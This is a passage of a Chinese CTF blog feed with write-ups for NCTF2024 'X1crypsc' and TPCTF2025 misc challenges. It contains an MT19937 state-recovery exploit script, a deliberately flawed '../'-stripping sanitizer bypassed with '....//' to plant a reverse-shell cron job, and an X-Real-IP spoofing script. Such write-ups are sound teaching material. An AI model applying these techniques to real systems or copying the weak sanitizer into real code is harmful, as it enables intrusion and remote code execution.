class="line"><span class="keyword">class</span> <span class="title class_">File</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        os.makedirs(<span class="string">&#x27;user_file&#x27;</span>, exist_ok=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">sanitize</span>(<span class="params">self, filename</span>):</span><br><span class="line">        <span class="keyword">if</span> filename.startswith(<span class="string">&#x27;/&#x27;</span>):</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&#x27;[!]Invalid filename&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> filename.replace(<span class="string">&#x27;../&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_path</span>(<span class="params">self, filename</span>):</span><br><span class="line">        hashed = hashlib.sha256(filename.encode()).hexdigest()[:<span class="number">8</span>]</span><br><span class="line">        sanitized = self.sanitize(filename)</span><br><span class="line">        <span class="keyword">return</span> os.path.join(keep_dir, hashed, sanitized)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">user_input</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            filename = <span class="built_in">input</span>(<span class="string">&#x27;[-]Please enter the file name you want to create: &#x27;</span>)</span><br><span class="line">            data = []</span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                line = <span class="built_in">input</span>(<span class="string">&#x27;[-]Now write something into the file (or type &quot;exit&quot; to finish writing): &#x27;</span>)</span><br><span class="line">                <span class="keyword">if</span> line.lower() == <span class="string">&#x27;exit&#x27;</span>:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                data.append(line)</span><br><span class="line">                another_line = <span class="built_in">input</span>(<span class="string">&#x27;[-]Write in another line? [y/n]: &#x27;</span>)</span><br><span class="line">                <span class="keyword">if</span> another_line.lower() != <span class="string">&#x27;y&#x27;</span>:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                path = self.get_path(filename)</span><br><span class="line">                os.makedirs(os.path.dirname(path), exist_ok=<span class="literal">True</span>)</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    <span class="keyword">for</span> line <span class="keyword">in</span> data:</span><br><span class="line">                        f.write(line)</span><br><span class="line">                        f.write(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;[+]Your file has been successfully saved at <span class="subst">&#123;path&#125;</span>, we promise we\&#x27;ll never lose it :)&#x27;</span>)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;[+]Something went wrong, please try again.&#x27;</span>)</span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                ask = <span class="built_in">input</span>(<span class="string">&#x27;[-]Create more files? [y/n]: &#x27;</span>)</span><br><span class="line">                <span class="keyword">if</span> ask.lower() == <span class="string">&#x27;y&#x27;</span>:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">elif</span> ask.lower() == <span class="string">&#x27;n&#x27;</span>:</span><br><span class="line">                    exit(<span class="number">0</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;[!]Invalid input, please try again.\n&#x27;</span>)</span><br><span class="line">file = File()</span><br><span class="line">file.user_input()</span><br><span class="line">exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><h4 id="一阶段解析">一阶段解析</h4><p>MT19937的伪随机和线性变换理解。<del>做出本题甚至不需要你有关于逆向MT19937相关的知识</del></p><h5 id="核心逻辑梳理"><strong>核心逻辑梳理</strong></h5><p>打怪的核心逻辑：</p><ul><li>怪兽的血量是<code>getrandbits(64)</code><br /></li><li>可以无限地洗炼武器的属性，每次会调用<code>getrandbits(16)</code>生成两个随机数，分别作为武器基础伤害下限、上下限之差<br /></li><li>怪兽在即将受到攻击时会闪现至<code>(randrange(2025),randrange(2025))</code>处，你需要预判怪兽的最终位置<br /></li><li>攻击怪兽时会用<strong>全局的</strong><code>randint</code>从武器的基础伤害中随机取值，并乘以一个<strong>Random新实例的</strong>（默认转化为0-1间的<code>float</code>）幂数</li></ul><p>显然我们的目的即为通过不断洗炼武器来收集足够多的随机数，以预测后面的随机数。</p><h5 id="random库相关"><strong>Random库相关</strong></h5><p>Random库的绝大多数函数所依赖的函数就是<code>getrandbits</code>。如<code>randint</code>的调用链就是<code>randint</code>-&gt; <code>_randbelow</code> -&gt; <code>getrandbits</code>。</p><p><code>getrandbits(n)</code>函数的特性：</p><ul><li>若 n =32，则会将MT19937对应下标的状态值<code>extract</code>后直接输出；<br /></li><li>若 n &lt;32，则会将<code>getrandbits(32)</code>的结果截断后输出（高位优先，如<code>n=16</code>下<code>0x12345678</code>会被截断为<code>0x1234</code>）；<br /></li><li>若 n &gt;32，则会多次调用<code>getrandbits(32)</code>，按后一次输出的结果在高位拼凑而成。</li></ul><blockquote><p><code>getrandbits(64)</code>确实是两个 <code>getrandbits(32)</code>拼接而成，但后者并不是两个 <code>getrandbits(16)</code>拼接而成，即<code>getrandbits(32)</code>是每次<code>extract</code>的最小单元。</p></blockquote><h5id="伪随机逆向之没有mt19937的mt19937"><strong>伪随机逆向之没有MT19937的MT19937</strong></h5><p>广义上来说，MT19937的系统的状态构成就是624*32=19968个二进制位，或者<span class="math display">\[Z_{2}\]</span>下的一个维度为19968的向量。</p><p>而MT19937的所有变换都是线性的，意即，MT19937的所有方法（<code>__init__</code>、<code>twist</code>、<code>extract</code>）都可以视为一个既有向量（或其一部分）和一个矩阵在<span class="math display">\[Z_{2}\]</span> 下做乘法的结果。</p><blockquote><p>相对地，非线性变换则指不能被表示成矩阵乘法的一种变换。</p></blockquote><blockquote><p>作为参考，AES中，<em>ShiftRows</em> 和 <em>MixColumns</em>这两种操作都是线性变换，起到扩散(Diffusion)的作用；而 <em>SubBytes</em>则是典型的非线性变换，起到混淆(Confusion)的作用。</p></blockquote><p>认识到线性变换这一特性的作用就在于，我们可以在不获得连续的19968个状态分量（传统的MT19937逆向）的情况下依然能够预测随机数。</p><p>假设存在 <span class="math display">\[Z_{2}\]</span> 下的一个初始向量<span class="math display">\[v_{19968}\]</span>，其中每一个维度都是MT19937的初始状态（624个32位数展开而得），经过“某种”变换（任意次数的状态旋转、提取、截取等等）后，由输出位经过特定方式排列的结果是结果向量<spanclass="math display">\[v^{&#39;}_{19968}\]</span>。由于这种变换是线性的，因此存在一个19968*19968的矩阵M，满足 <span class="math display">\[v^{&#39;} = v \cdotM\]</span>。</p><p>此时只需要找到这个变换矩阵 M，即可通过 <spanclass="math display">\[v^{&#39;}\]</span> 反推出 v。</p><p>而在上述执行的变换确定的情况下，通过打黑盒即可确定M。具体地，构造一个全零的、19968维的向量 v，依次让第 i位为1，每次执行和题目相同的变换（重复<code>getrandbits</code>操作）并记录结果，获得的19968个二进制位即为M 的第 I 行。</p><p>M构造完成后再和题目交互，得到向量后直接<code>solve_left</code>就可以得到MT19937的初始状态；将之代入<code>Random</code>的新实例中，和题目以相同的方式运行一遍，即可来到和交互环境中的MT19937相同的状态。随后将本地和远程的PRNG同步，即可开挂把怪打掉。</p><blockquote><p>这个矩阵 M是19968*19968的，构造之非常耗时和烧内存，由于该矩阵是确定的，因此建议只构造一次并将之存储起来，需要重新打/debug时再加载；可能需要虚拟内存（否则Windows下挂WSL的sage可能会崩）</p></blockquote><h4 id="一阶段exp">一阶段exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sage</span></span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).environ[<span class="string">&#x27;TERM&#x27;</span>] = <span class="string">&#x27;xterm&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">io = process([<span class="string">&#x27;python3&#x27;</span>,<span class="string">&#x27;task.py&#x27;</span>])</span><br><span class="line">t0 = time()</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">monster_hp = <span class="built_in">int</span>(io.recvline().strip().decode())</span><br><span class="line"></span><br><span class="line">whatls = []</span><br><span class="line">whatls.extend(<span class="built_in">int</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">bin</span>(monster_hp)[<span class="number">2</span>:].zfill(<span class="number">64</span>))</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;option:&#x27;</span>,<span class="string">b&#x27;W&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">n1 = <span class="built_in">int</span>(io.recvuntil(<span class="string">b&#x27;~&#x27;</span>,drop=<span class="literal">True</span>).strip().decode())</span><br><span class="line">n2 = <span class="built_in">int</span>(io.recvline().strip().decode()) - n1</span><br><span class="line">whatls.extend(<span class="built_in">int</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">bin</span>(n1)[<span class="number">2</span>:].zfill(<span class="number">16</span>))</span><br><span class="line">whatls.extend(<span class="built_in">int</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">bin</span>(n2)[<span class="number">2</span>:].zfill(<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;?&#x27;</span>,<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">n1 = <span class="built_in">int</span>(io.recvuntil(<span class="string">b&#x27;~&#x27;</span>,drop=<span class="literal">True</span>).strip().decode())</span><br><span class="line">n2 = <span class="built_in">int</span>(io.recvline().strip().decode()) - n1</span><br><span class="line">whatls.extend(<span class="built_in">int</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">bin</span>(n1)[<span class="number">2</span>:].zfill(<span class="number">16</span>))</span><br><span class="line">whatls.extend(<span class="built_in">int</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">bin</span>(n2)[<span class="number">2</span>:].zfill(<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">620</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;option:&#x27;</span>,<span class="string">b&#x27;W&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;?&#x27;</span>,<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    n1 = <span class="built_in">int</span>(io.recvuntil(<span class="string">b&#x27;~&#x27;</span>,drop=<span class="literal">True</span>).strip().decode())</span><br><span class="line">    n2 = <span class="built_in">int</span>(io.recvline().strip().decode()) - n1</span><br><span class="line">    whatls.extend(<span class="built_in">int</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">bin</span>(n1)[<span class="number">2</span>:].zfill(<span class="number">16</span>))</span><br><span class="line">    whatls.extend(<span class="built_in">int</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">bin</span>(n2)[<span class="number">2</span>:].zfill(<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line">weapon_data = [<span class="built_in">int</span>(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>,whatls[-<span class="number">32</span>:-<span class="number">16</span>])),<span class="number">2</span>),<span class="built_in">int</span>(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>,whatls[-<span class="number">16</span>:])),<span class="number">2</span>)]</span><br><span class="line">weapon_data[<span class="number">1</span>] += weapon_data[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"># map a linear transformation matrix</span></span><br><span class="line"><span class="string"># compute for first time only, afterwards comment this section for memory &amp; time conservation</span></span><br><span class="line"><span class="string">mt = []</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">for i in range(19968):</span></span><br><span class="line"><span class="string">    f_stats = [0] * 19968</span></span><br><span class="line"><span class="string">    f_stats[i] = 1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    state = [int(&#x27;&#x27;.join(map(str,f_stats[i*32:(i+1)*32])),2) for i in range(624)]</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    r = Random()</span></span><br><span class="line"><span class="string">    r.setstate((3,tuple(state+[624]),None))</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    vc = []</span></span><br><span class="line"><span class="string">    vc.extend(int(i) for i in bin(r.getrandbits(64))[2:].zfill(64))</span></span><br><span class="line"><span class="string">    for _ in range(622): # 624 - 2 = 622</span></span><br><span class="line"><span class="string">        vc.extend(int(i) for i in bin(getrandbits(16))[2:].zfill(16))</span></span><br><span class="line"><span class="string">        vc.extend(int(i) for i in bin(getrandbits(16))[2:].zfill(16))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mt.append(vc)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">save(mt,&#x27;mt.sobj&#x27;)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">t0 = time()</span><br><span class="line">mt = load(<span class="string">&#x27;mt.sobj&#x27;</span>) <span class="comment">#matrix(GF(2),...)</span></span><br><span class="line"><span class="built_in">breakpoint</span>()</span><br><span class="line">resvec = vector(GF(<span class="number">2</span>),whatls)</span><br><span class="line">init = mt.solve_left(resvec)</span><br><span class="line"></span><br><span class="line">impl_state = [<span class="built_in">int</span>(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>,init[i*<span class="number">32</span>:(i+<span class="number">1</span>)*<span class="number">32</span>])),<span class="number">2</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">624</span>)]</span><br><span class="line"></span><br><span class="line">rn = Random()</span><br><span class="line">rn.setstate((<span class="number">3</span>,<span class="built_in">tuple</span>(impl_state+[<span class="number">624</span>]),<span class="literal">None</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1244</span>): <span class="comment"># 622*2</span></span><br><span class="line">    rn.getrandbits(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    x_grid = rn.randrange(<span class="number">2025</span>)</span><br><span class="line">    y_grid = rn.randrange(<span class="number">2025</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;option:&#x27;</span>,<span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;aim:&#x27;</span>,<span class="string">f&#x27;<span class="subst">&#123;x_grid&#125;</span> <span class="subst">&#123;y_grid&#125;</span>&#x27;</span>.encode())</span><br><span class="line">    rn.randint(weapon_data[<span class="number">0</span>],weapon_data[<span class="number">1</span>])</span><br><span class="line">    io.recvline()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;Victory&#x27;</span> <span class="keyword">in</span> io.recvline():</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;time = <span class="subst">&#123;time() - t0:<span class="number">.2</span>f&#125;</span>s&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h4 id="二阶段">二阶段</h4><p>成功进入第二阶段，这部分在题目中没有给出源码</p><figure><imgsrc="/images/NCTF2024-X1crypsc、谁动了我的MC？-Official-Writeup/791b2ab0-657e-4114-972c-d73f57aff16a.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>其实经过简单尝试就能发现，这里只是过滤了../而且要求文件名不能以/开头，我们通过双写<code>....//</code>就能绕过做到目录穿越。这里我们可以向定时任务写入反弹shell的命令。但是有一点要注意的是，定时任务的命令结尾必须以换行符结束，可以参考<ahref="https://zahui.fan/posts/63d10d9c/">这篇文章</a>。因此，我们在输入内容后要记得再换一下行，输入一个空格（什么都不写是换不成功的）。</p><blockquote><p>其实也可以直接去改task.py，但这里就展示一下定时任务的做法了</p></blockquote><figure><imgsrc="/images/NCTF2024-X1crypsc、谁动了我的MC？-Official-Writeup/f3a5ac4c-b6da-46d0-b356-fe558199de37.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/NCTF2024-X1crypsc、谁动了我的MC？-Official-Writeup/60f8fd93-1e90-4f17-a902-b8ae82060fdc.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>flag在题目进程的环境变量里</p><figure><imgsrc="/images/NCTF2024-X1crypsc、谁动了我的MC？-Official-Writeup/a54ef8c1-ebfa-4663-90f5-73796641058b.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> NCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TPCTF2025 misc writeup+复现</title>
      <link href="/posts/f0a22888/"/>
      <url>/posts/f0a22888/</url>
      
        <content type="html"><![CDATA[<h2 id="writeup">Writeup</h2><h3 id="misc">Misc</h3><h4 id="raenil">raenil</h4><blockquote><p>做完就瞎了</p></blockquote><p>给了一个GIF，是被拉伸变形的二维码。</p><p>从掩码可以看出左边的图是正着的，右边的是倒着的。</p><p>不会p图，硬看然后qrazybox手动恢复，干就完了。</p><figure><imgsrc="/images/TPCTF2025-misc-writeup-复现/image-20250308180735477.png"alt="image-20250308180735477" /><figcaption aria-hidden="true">image-20250308180735477</figcaption></figure><p>padding bits recovery自动填充一下</p><figure><imgsrc="/images/TPCTF2025-misc-writeup-复现/image-20250308180853635.png"alt="image-20250308180853635" /><figcaption aria-hidden="true">image-20250308180853635</figcaption></figure><p>然后reed solomon decoder解码就行</p><figure><imgsrc="/images/TPCTF2025-misc-writeup-复现/image-20250308181238532.png"alt="image-20250308181238532" /><figcaption aria-hidden="true">image-20250308181238532</figcaption></figure><h4 id="nanonymous-spam">nanonymous spam</h4><p>观察可以发现，用户名与ip有关，肯定是要伪造ip，但是XFF头好像没用，试了下这里X-Real-IP头可以用。</p><p>后面就是找ip和用户名的对应关系。用户名总共由四个部分构成，本来以为就是每个部分对应了一个字典，后来发现中间这四个部分之间存在换位的现象，但实际上用的仍然是四个互不相交的字典，最终测出来具体规律如下：</p><p>一个部分用的是一个长度为103的字典，这个部分永远是第一个变化的，因此周期是103个ip；</p><p>一个部分用的是一个长度为512的字典，这个部分是第二个变化的，因此周期是103*512个ip；</p><p>一个部分用的是一个长度为313的字典，这个部分是第三个变化的，因此周期是103*512*313个ip；</p><p>最后一个部分则是每103*512*313个ip变化一次。</p><p>前三个部分在第一次发生换位之前就能根据周期很容易地测出来，下面是测最后这个部分所用的脚本，简单来说就是如果发现元素不属于前三个部分的字典，那它就是属于最后这个部分，这样后面不管怎么换位我们都能精准地找到这一部分</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> ipaddress</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">increment_ip</span>(<span class="params">ip</span>):</span><br><span class="line">    ip_int = <span class="built_in">int</span>(ipaddress.IPv4Address(ip))</span><br><span class="line"></span><br><span class="line">    ip_int += <span class="number">103</span>*<span class="number">512</span>*<span class="number">313</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ip_int &gt; <span class="built_in">int</span>(ipaddress.IPv4Address(<span class="string">&#x27;255.255.255.255&#x27;</span>)):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(ipaddress.IPv4Address(ip_int))</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://1.95.184.40:8520/&quot;</span></span><br><span class="line">headers_template = &#123;</span><br><span class="line">    <span class="string">&#x27;X-Real-IP&#x27;</span>: <span class="literal">None</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pattern = re.<span class="built_in">compile</span>(<span class="string">r&#x27;&lt;h2&gt;Post a Message&lt;/h2&gt;\s*&lt;div class=&quot;username&quot;&gt;User: (.+?)&lt;/div&gt;&#x27;</span>, re.DOTALL)</span><br><span class="line"></span><br><span class="line">current_ip = <span class="string">&#x27;0.0.0.0&#x27;</span></span><br><span class="line">first=[<span class="string">&#x27;Nod&#x27;</span>, <span class="string">&#x27;Tap&#x27;</span>, <span class="string">&#x27;Liz&#x27;</span>, <span class="string">&#x27;Mel&#x27;</span>, <span class="string">&#x27;Fig&#x27;</span>, <span class="string">&#x27;Rif&#x27;</span>, <span class="string">&#x27;Rip&#x27;</span>, <span class="string">&#x27;Pud&#x27;</span>, <span class="string">&#x27;Foo&#x27;</span>, <span class="string">&#x27;Haw&#x27;</span>, <span class="string">&#x27;Wef&#x27;</span>, <span class="string">&#x27;Kel&#x27;</span>, <span class="string">&#x27;Gat&#x27;</span>, <span class="string">&#x27;Hod&#x27;</span>, <span class="string">&#x27;Mom&#x27;</span>, <span class="string">&#x27;Lin&#x27;</span>, <span class="string">&#x27;Fez&#x27;</span>, <span class="string">&#x27;Rua&#x27;</span>, <span class="string">&#x27;Fay&#x27;</span>, <span class="string">&#x27;Pat&#x27;</span>, <span class="string">&#x27;Ned&#x27;</span>, <span class="string">&#x27;Taz&#x27;</span>, <span class="string">&#x27;Sid&#x27;</span>, <span class="string">&#x27;Mic&#x27;</span>, <span class="string">&#x27;Nom&#x27;</span>, <span class="string">&#x27;Hab&#x27;</span>, <span class="string">&#x27;Rug&#x27;</span>, <span class="string">&#x27;Men&#x27;</span>, <span class="string">&#x27;Nok&#x27;</span>, <span class="string">&#x27;Fun&#x27;</span>, <span class="string">&#x27;Pox&#x27;</span>, <span class="string">&#x27;Red&#x27;</span>, <span class="string">&#x27;Jah&#x27;</span>, <span class="string">&#x27;Tet&#x27;</span>, <span class="string">&#x27;Hip&#x27;</span>, <span class="string">&#x27;Tem&#x27;</span>, <span class="string">&#x27;Bad&#x27;</span>, <span class="string">&#x27;Mir&#x27;</span>, <span class="string">&#x27;Taj&#x27;</span>, <span class="string">&#x27;Maf&#x27;</span>, <span class="string">&#x27;Rac&#x27;</span>, <span class="string">&#x27;Zia&#x27;</span>, <span class="string">&#x27;Hea&#x27;</span>, <span class="string">&#x27;Fis&#x27;</span>, <span class="string">&#x27;Dem&#x27;</span>, <span class="string">&#x27;Bim&#x27;</span>, <span class="string">&#x27;Gow&#x27;</span>, <span class="string">&#x27;Hub&#x27;</span>, <span class="string">&#x27;Job&#x27;</span>, <span class="string">&#x27;Nex&#x27;</span>, <span class="string">&#x27;Jas&#x27;</span>, <span class="string">&#x27;Lie&#x27;</span>, <span class="string">&#x27;Sim&#x27;</span>, <span class="string">&#x27;Poc&#x27;</span>, <span class="string">&#x27;Ran&#x27;</span>, <span class="string">&#x27;Voa&#x27;</span>, <span class="string">&#x27;Gig&#x27;</span>, <span class="string">&#x27;Jes&#x27;</span>, <span class="string">&#x27;Nie&#x27;</span>, <span class="string">&#x27;Lal&#x27;</span>, <span class="string">&#x27;Lek&#x27;</span>, <span class="string">&#x27;Pen&#x27;</span>, <span class="string">&#x27;Cos&#x27;</span>, <span class="string">&#x27;Col&#x27;</span>, <span class="string">&#x27;Nao&#x27;</span>, <span class="string">&#x27;Mop&#x27;</span>, <span class="string">&#x27;Bac&#x27;</span>, <span class="string">&#x27;Cis&#x27;</span>, <span class="string">&#x27;Mor&#x27;</span>, <span class="string">&#x27;Vim&#x27;</span>, <span class="string">&#x27;Ceo&#x27;</span>, <span class="string">&#x27;Gic&#x27;</span>, <span class="string">&#x27;Mii&#x27;</span>, <span class="string">&#x27;Dep&#x27;</span>, <span class="string">&#x27;Len&#x27;</span>, <span class="string">&#x27;Few&#x27;</span>, <span class="string">&#x27;Lob&#x27;</span>, <span class="string">&#x27;Lea&#x27;</span>, <span class="string">&#x27;Bec&#x27;</span>, <span class="string">&#x27;Mui&#x27;</span>, <span class="string">&#x27;Pec&#x27;</span>, <span class="string">&#x27;Mab&#x27;</span>, <span class="string">&#x27;Her&#x27;</span>, <span class="string">&#x27;Tas&#x27;</span>, <span class="string">&#x27;Tui&#x27;</span>, <span class="string">&#x27;Kun&#x27;</span>, <span class="string">&#x27;Vic&#x27;</span>, <span class="string">&#x27;Too&#x27;</span>, <span class="string">&#x27;Woe&#x27;</span>, <span class="string">&#x27;Uav&#x27;</span>, <span class="string">&#x27;Dam&#x27;</span>, <span class="string">&#x27;Jin&#x27;</span>, <span class="string">&#x27;Kaz&#x27;</span>, <span class="string">&#x27;Yew&#x27;</span>, <span class="string">&#x27;Cid&#x27;</span>, <span class="string">&#x27;Jaw&#x27;</span>, <span class="string">&#x27;Hay&#x27;</span>, <span class="string">&#x27;Gib&#x27;</span>, <span class="string">&#x27;Mis&#x27;</span>, <span class="string">&#x27;Til&#x27;</span>, <span class="string">&#x27;Six&#x27;</span>, <span class="string">&#x27;Bot&#x27;</span>, <span class="string">&#x27;Guo&#x27;</span>]</span><br><span class="line">second=[<span class="string">&#x27;Wim&#x27;</span>, <span class="string">&#x27;Het&#x27;</span>, <span class="string">&#x27;Fau&#x27;</span>, 